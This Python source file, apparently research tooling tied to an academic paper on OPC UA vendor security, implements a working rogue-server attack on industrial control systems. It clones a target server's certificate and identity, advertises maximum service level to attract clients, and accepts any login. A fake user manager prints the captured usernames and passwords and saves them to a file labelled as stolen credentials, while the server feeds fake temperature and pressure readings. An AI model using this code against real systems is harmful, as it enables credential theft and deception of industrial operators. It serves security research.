import datetime
import os
import re
import socket
import ssl
import sys
import time
import traceback
from random import randint

from opcua import Client, Server, tools, ua, uamethod
from opcua.crypto import uacrypto
from opcua.server.user_manager import UserManager
from OpenSSL import SSL, crypto

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

"""
Original creators of the code: Alessandro Erba, Anne Müller, Nils Ole Tippenhauer
Paper: Security Analysis of Vendor Implementations of the OPC UA Protocol for Industrial Control Systems
DOI: 10.1145/3560826.3563380
"""


"""
Useful string dict mappings

Mappings can be expanded to support other security policies
"""
security_policy_dict = {
    "Basic256Sha256_Sign": ua.SecurityPolicyType.Basic256Sha256_Sign,
    "Basic256Sha256_SignAndEncrypt": ua.SecurityPolicyType.Basic256Sha256_SignAndEncrypt,
    "None_None": ua.SecurityPolicyType.NoSecurity,  # Added to support unsecured endpoints
}

identity_tokens_dict = {
    "Anonymous": "Anonymous",
    "anonymous": "Anonymous",
    "certificate_basic256sha256": "Basic256Sha256",
    "UserName": "Username",
    "username": "Username",
}


def get_x509_fields_dict(cert):
    """
    Certificate generation can be improved adding more strings from here
    https://people.eecs.berkeley.edu/~jonah/bc/org/bouncycastle/asn1/x509/X509Name.html
    if  cert.get_subject().XX none returns None

    Parameters
    -------
    cert:[X509 object]
        [certificate to clone]
    """
    x509_fields_dict = {
        "countryName": cert.get_subject().C,
        "stateOrProvinceName": cert.get_subject().ST,
        "localityName": cert.get_subject().L,
        "organizationName": cert.get_subject().O,
        "domainComponent": cert.get_subject().DC,
        "commonName": cert.get_subject().CN,
        "emailAddress": cert.get_subject().emailAddress,
        "serialNumber": cert.get_serial_number(),
        "subjectAltName": get_certificate_subjectaltname(cert),
        "nsComment": "",
        "basicConstraints": None,
        "basicConstraintsCritical": False,
    }

    try:
        for i in range(cert.get_extension_count()):
            ext = cert.get_extension(i)
            if ext.get_short_name() == b"basicConstraints":
                x509_fields_dict["basicConstraints"] = ext.__str__().strip()
                x509_fields_dict["basicConstraintsCritical"] = ext.get_critical()
                break
    except Exception:
        pass

    # try to extract Netscape Comment (nsComment) if present
    try:
        for i in range(0, cert.get_extension_count()):
            ext = cert.get_extension(i)
            # match by short name or textual representation
            if "nsComment" in str(ext.get_short_name()) or "Netscape Comment" in str(
                ext
            ):
                x509_fields_dict["nsComment"] = ext.__str__().strip()
                break
    except Exception:
        pass

    return x509_fields_dict


def get_certificate_subjectaltname(x509cert):
    # https://stackoverflow.com/questions/49491732/pyopenssl-how-can-i-get-sansubject-alternative-names-list
    san = ""
    ext_count = x509cert.get_extension_count()
    for i in range(0, ext_count):
        ext = x509cert.get_extension(i)
        if "subjectAltName" in str(ext.get_short_name()):
            san = ext.__str__()
    # san = san.split(",");
    return san


# Added
def normalize_subject_alt_name(subject_alt_name):
    """
    Convert SAN text from certificate dumps into the format OpenSSL expects.

    The source certificate may expose entries like "URL=..." and "DNS Name=..."
    while X509Extension expects "URI:..." and "DNS:...".
    """
    if not subject_alt_name:
        return ""

    normalized_entries = []
    for entry in subject_alt_name.split(","):
        entry = entry.strip()
        if entry.startswith("URL="):
            normalized_entries.append("URI:" + entry[len("URL=") :])
        elif entry.startswith("DNS Name="):
            normalized_entries.append("DNS:" + entry[len("DNS Name=") :])
        elif entry.startswith("IP Address="):
            normalized_entries.append("IP:" + entry[len("IP Address=") :])
        else:
            normalized_entries.append(entry)

    return ", ".join(normalized_entries)


def generate_certificate(
    dict,
    validityStartInSeconds=0,
    validityEndInSeconds=10 * 365 * 24 * 60 * 60,
    KEY_FILE=os.path.join(os.path.dirname(__file__), "generated_cert_key.pem"),
    CERT_FILE=os.path.join(os.path.dirname(__file__), "generated_cert.pem"),
):
    """
    generate the private and public key of the Rogue Server
    clonign all the information retrieved by the target server certificate.

    Parameters
    ----------
    dict : [dictionary]
        [dictionary obtained from calling get_certificate_subjectaltname()]
    validityStartInSeconds : int, optional
        [date of cert validity in seconds], by default 0
    validityEndInSeconds : [type], optional
        [date of cert expiration in seconds], by default 10*365*24*60*60
    KEY_FILE : [type], optional
        [location where the rogue server key will be stored], by default os.path.join(os.path.dirname( __file__), 'generated_cert_key.pem')
    CERT_FILE : [type], optional
        [location where the rogue server certificate will be stored], by default os.path.join(os.path.dirname(__file__), 'generated_cert.pem')
    """
    try:
        # create a key pair
        k = crypto.PKey()
        k.generate_key(crypto.TYPE_RSA, 2048)
        # create a self-signed cert
        cert = crypto.X509()
        cert.set_version(2)
        cert.gmtime_adj_notBefore(0)
        cert.gmtime_adj_notAfter(validityEndInSeconds)
        cert.set_pubkey(k)
        if dict.get("countryName"):
            cert.get_subject().C = dict["countryName"]
        if dict.get("stateOrProvinceName"):
            cert.get_subject().ST = dict.get("stateOrProvinceName")
        if dict.get("localityName"):
            cert.get_subject().L = dict.get("localityName")
        if dict.get("organizationName"):
            cert.get_subject().O = dict["organizationName"]
        if dict.get("domainComponent"):
            cert.get_subject().DC = dict["domainComponent"]
        # cert.get_subject().OU = dict['organizationUnitName']
        if dict.get("commonName"):
            cert.get_subject().CN = dict["commonName"]
        if dict.get("emailAddress"):
            cert.get_subject().emailAddress = dict.get("emailAddress")
        
        # Use a bitmask to guarantee a positive 64-bit unsigned integer
        serial_number = int(dict["serialNumber"]) & 0x7FFFFFFFFFFFFFFF
        if serial_number == 0:
            serial_number = 1
        cert.set_serial_number(serial_number)

        extensions = [
            crypto.X509Extension(
                b"keyUsage",
                False,
                b"nonRepudiation, digitalSignature, keyEncipherment, dataEncipherment, keyCertSign",
            ),
            crypto.X509Extension(b"subjectKeyIdentifier", False, b"hash", subject=cert),
            crypto.X509Extension(b"extendedKeyUsage", False, b"serverAuth, clientAuth"),
        ]

        bc_val = dict.get("basicConstraints")
        if bc_val:
            # Normalize pyOpenSSL's read string format into standard format
            if "Subject Type=End Entity" in bc_val or "CA:FALSE" in bc_val:
                bc_string = b"CA:FALSE"
            elif "Subject Type=CA" in bc_val or "CA:TRUE" in bc_val:
                bc_string = b"CA:TRUE"
            else:
                bc_string = bc_val.encode()

            # Read the original critical flag state dynamically
            is_critical = dict.get("basicConstraintsCritical", False)

            extensions.append(
                crypto.X509Extension(b"basicConstraints", is_critical, bc_string)
            )

        # Append subjectAltName safely without using rigid index insertion
        subject_alt_name = dict.get("subjectAltName")
        if subject_alt_name:
            try:
                subject_alt_name = normalize_subject_alt_name(subject_alt_name)
                extensions.append(
                    crypto.X509Extension(
                        b"subjectAltName",
                        False,
                        subject_alt_name.replace(" Address", "").encode(),
                    )
                )
            except Exception:
                print(
                    "Skipping subjectAltName cloning because OpenSSL rejected it:",
                    flush=True,
                )
                traceback.print_exc()

        # preserve Netscape Comment (nsComment) extension if available
        ns_comment = dict.get("nsComment")
        if ns_comment:
            try:
                extensions.append(
                    crypto.X509Extension(b"nsComment", False, ns_comment.encode())
                )
            except Exception:
                print(
                    "Skipping nsComment cloning because OpenSSL rejected it:",
                    flush=True,
                )
                traceback.print_exc()

        # Set issuer before extension
        cert.set_issuer(cert.get_subject())
        
        cert.add_extensions(extensions)
        cert.add_extensions(
            [
                crypto.X509Extension(
                    b"authorityKeyIdentifier", False, b"issuer", issuer=cert
                )
            ]
        )

        
        cert.sign(k, "sha256")
        with open(CERT_FILE, "wt") as f:
            f.write(crypto.dump_certificate(crypto.FILETYPE_PEM, cert).decode("utf-8"))
        with open(KEY_FILE, "wt") as f:
            f.write(crypto.dump_privatekey(crypto.FILETYPE_PEM, k).decode("utf-8"))
    except Exception as e:
        print("generate_certificate failed:", flush=True)
        traceback.print_exc()
        raise


def connect_and_get_server_endpoints(client):
    """
    re-implement the method from python opcua/client/client.py to make it consistet with the OPC UA standard i.e. without OpenSecureChannel
    Parameters
    """
    client.connect_socket()
    try:
        client.send_hello()
        client.open_secure_channel()  # Added missing OPN
        endpoints = client.get_endpoints()
    finally:
        client.disconnect_socket()
    return endpoints


def connect_and_find_servers(client):
    """re-implement the method from python opcua/client/client.py to make it consistet with the OPC UA standard i.e. without OpenSecureChannel)"""
    """
    Connect, ask server for a list of known servers, and disconnect
    """
    client.connect_socket()
    try:
        client.send_hello()
        client.open_secure_channel()  # Added missing OPN
        servers = client.find_servers()
        client.close_secure_channel()
    finally:
        client.disconnect_socket()
    return servers


def copy_server_info_and_clone_certificate(address, port):
    """
    Copy target server info and clone the certificate

    Parameters
    ----------
    address : [string]
        [target server address]
    port : [string]
        [target server port]

    Returns
    -------
    [dictionary]
        [dictionary containint server info]
    """
    client = Client("opc.tcp://" + address + ":" + port)
    print("Performing discovery at {0}\n".format("opc.tcp://" + address + ":" + port))
    server_info = {}
    server = connect_and_find_servers(client)[0]
    server_info["server_name"] = server.ApplicationName.to_string()
    server_info["server_uri"] = server.ApplicationUri
    endpoints = connect_and_get_server_endpoints(client)
    server_info["endpoints"] = []
    i = 0
    for endpoint in endpoints:
        # Extract the mode and map it from an integer string to a name
        mode_mapping = {"1": "None", "2": "Sign", "3": "SignAndEncrypt"}
        raw_mode = str(endpoint.SecurityMode).split(".")[-1]
        security_mode = mode_mapping.get(raw_mode, raw_mode)

        # Extract the part after '#' for policy (or default to 'None' if missing)
        policy_uri = str(endpoint.SecurityPolicyUri)
        security_policy = policy_uri.split("#")[-1] if "#" in policy_uri else "None"

        found_info = {}
        found_info["SecurityMode"] = security_mode
        found_info["SecurityPolicy"] = security_policy

        lookup_key = found_info["SecurityPolicy"] + "_" + found_info["SecurityMode"]

        if lookup_key in security_policy_dict:
            server_info["endpoints"].append(security_policy_dict[lookup_key])
        else:
            print(f"Warning: '{lookup_key}' not found.")
            print(f"Available keys are: {list(security_policy_dict.keys())}")

        if i == 0:
            # Store target server certificate to file
            bcert = endpoint.ServerCertificate
            cert = ssl.DER_cert_to_PEM_cert(bcert)
            path = os.path.join(os.path.dirname(__file__), "retrived_server_cert.pem")
            f = open(path, "w")
            f.write(cert)
            f.close()

        server_info["identitytokens"] = []
        for tok in endpoint.UserIdentityTokens:
            server_info["identitytokens"].append(identity_tokens_dict[tok.PolicyId])
        i = i + 1

    # load target server certificate and clone it (the certificate is stored in the file system)
    cert = crypto.load_certificate(crypto.FILETYPE_PEM, cert)
    generate_certificate(get_x509_fields_dict(cert))

    return server_info


def user_manager(isession, username, password):
    """
    Fake user manager, it receives user credentials,
    decrypts them, prints them in the command line interface and stores them in the file system.
    Returns
    -------
    [bool]
        [returns True, the victim client believes to be authenticated]
    """
    isession.user = UserManager.User
    print("Incoming Connection with Authentication")
    print("Stolen Credentials:")
    print("Username: " + username)
    print("Password: " + password)
    stolen_credentials = {}
    stolen_credentials["username"] = username
    stolen_credentials["password"] = password
    with open("stolen_credentials.txt", "w") as f:
        f.write(str(stolen_credentials))
        f.close
    return True


def start_rogue_server(server_info):
    """
    OPC-UA-Server Setup
    """
    server = Server()

    hostname = socket.gethostname()

    # Changed endpoint from localhost
    endpoint = "opc.tcp://" + hostname + ":4841"
    server.set_endpoint(endpoint)
    print(endpoint)

    server_name = server_info["server_name"]
    server.set_server_name(server_name)
    address_space = server.register_namespace("namespace")

    uri = server_info["server_uri"]
    server.set_application_uri(uri)

    cert = os.path.join(os.path.dirname(__file__), "generated_cert.pem")
    key = os.path.join(os.path.dirname(__file__), "generated_cert_key.pem")
    server.load_certificate(cert)
    server.load_private_key(key)

    server.set_security_policy(server_info["endpoints"])
    server.set_security_IDs(server_info["identitytokens"])

    server.user_manager.set_user_manager(user_manager)

    """
    OPC-UA-Modeling
    """
    root_node = server.get_root_node()
    object_node = server.get_objects_node()
    server_node = server.get_server_node()

    try:
        server.import_xml("custom_nodes.xml")
    except FileNotFoundError:
        pass
    except Exception as e:
        print(e)

    servicelevel_node = server.get_node("ns=0;i=2267")  # Service-Level Node
    servicelevel_value = 255  # 0-255 [Byte]
    servicelevel_dv = ua.DataValue(ua.Variant(servicelevel_value, ua.VariantType.Byte))
    servicelevel_node.set_value(servicelevel_dv)

    parameter_obj = server.nodes.objects.add_object(address_space, "Parameter")
    token_node = parameter_obj.add_variable(
        address_space, "token", ua.Variant(0, ua.VariantType.UInt32)
    )
    # token_node.set_writable() #if clients should be able to write
    Temp = parameter_obj.add_variable(address_space, "Temperature", 0)
    Press = parameter_obj.add_variable(address_space, "Pressure", 0)
    Time = parameter_obj.add_variable(address_space, "Time", 0)

    """
    OPC-UA-Server Start
    """
    server.start()
    try:
        while 1:
            Temp.set_value(randint(0, 100))
            Press.set_value(randint(20, 35))
            Time.set_value(datetime.datetime.now())
            time.sleep(2)
    except KeyboardInterrupt:
        server.stop()
